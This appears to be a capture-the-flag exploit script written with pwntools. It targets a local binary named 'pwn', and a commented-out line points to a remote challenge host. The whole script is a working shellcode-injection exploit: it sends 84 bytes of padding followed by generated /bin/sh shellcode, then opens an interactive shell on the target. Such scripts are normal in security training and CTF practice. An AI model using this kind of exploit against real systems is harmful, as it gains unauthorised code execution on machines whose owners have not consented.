from pwn import *

context(os='linux', arch='amd64')
p = process('./pwn')
# p = remote('node.yuzhian.com.cn', 33393)
shellcode = asm(shellcraft.sh())
payload = b'a' * 84 + shellcode
p.sendline(payload)

p.interactive()
